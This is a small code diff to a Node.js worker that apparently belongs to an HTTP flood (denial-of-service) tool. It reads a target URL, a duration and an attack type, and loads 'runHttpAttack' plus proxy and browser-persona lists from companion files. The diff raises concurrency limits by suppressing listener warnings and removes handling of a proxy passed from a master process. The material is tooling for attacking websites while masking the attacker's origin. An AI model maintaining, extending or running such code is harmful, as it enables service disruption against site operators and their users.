@@ -1,3 +1,4 @@
+require('events').defaultMaxListeners = 0; // Suppress MaxListenersExceededWarning for this high-concurrency process
 const url = require('url');
 const crypto = require('crypto');
 const net = require('net');
@@ -6,10 +7,6 @@ const dns = require('dns');
 const { runHttpAttack } = require('./bypass.js');
 const { browserPersonas, proxyList } = require('./extensions.js');
 
-const proxyUrlFromMaster = process.env.PROXY_URL;
-if (proxyUrlFromMaster) {
-    proxyList.push(proxyUrlFromMaster);
-}
 const [targetUrl, durationSeconds] = process.argv.slice(2);
 const workerAttackType = process.env.ATTACK_TYPE;
 const parsedUrl = url.parse(targetUrl);
